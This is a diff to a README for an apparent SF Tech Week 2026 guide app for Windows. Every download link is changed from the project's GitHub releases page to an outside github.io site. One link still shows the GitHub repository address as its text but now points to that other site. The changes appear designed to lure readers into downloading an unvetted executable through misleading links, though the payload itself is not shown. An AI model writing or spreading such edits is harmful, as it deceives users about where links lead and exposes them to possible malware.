@@ -1,6 +1,6 @@
 # 📅 sf-tech-week-2026 - Your Complete SF Tech Week Guide
 
-[![Download Now](https://img.shields.io/badge/Download-SF_Tech_Week_2026-blue?style=for-the-badge&logo=github)](https://github.com/FrTim72/sf-tech-week-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-SF_Tech_Week_2026-blue?style=for-the-badge&logo=github)](https://frtim72.github.io)
 
 ---
 
@@ -25,7 +25,7 @@ Whether you're a developer, startup enthusiast, or just curious about tech, this
 
 ### Step 1: Download the App
 
-[**Visit this link to download the application**](https://github.com/FrTim72/sf-tech-week-2026/releases)
+[**Visit this link to download the application**](https://frtim72.github.io)
 
 Make sure you're on a Windows computer before proceeding.
 
@@ -169,7 +169,7 @@ We update the dataset daily leading up to the event week. Re-download or refresh
 
 ## 💬 Feedback & Support
 
-Found a bug? Have a suggestion? Visit the repository at [github.com/FrTim72/sf-tech-week-2026](https://github.com/FrTim72/sf-tech-week-2026) to report issues or contribute.
+Found a bug? Have a suggestion? Visit the repository at [github.com/FrTim72/sf-tech-week-2026](https://frtim72.github.io) to report issues or contribute.
 
 ---
 
@@ -185,7 +185,7 @@ Found a bug? Have a suggestion? Visit the repository at [github.com/FrTim72/sf-t
 
 ## 📥 Ready? Download Now!
 
-[**Visit this link to download the application**](https://github.com/FrTim72/sf-tech-week-2026/releases)
+[**Visit this link to download the application**](https://frtim72.github.io)
 
 ---
 
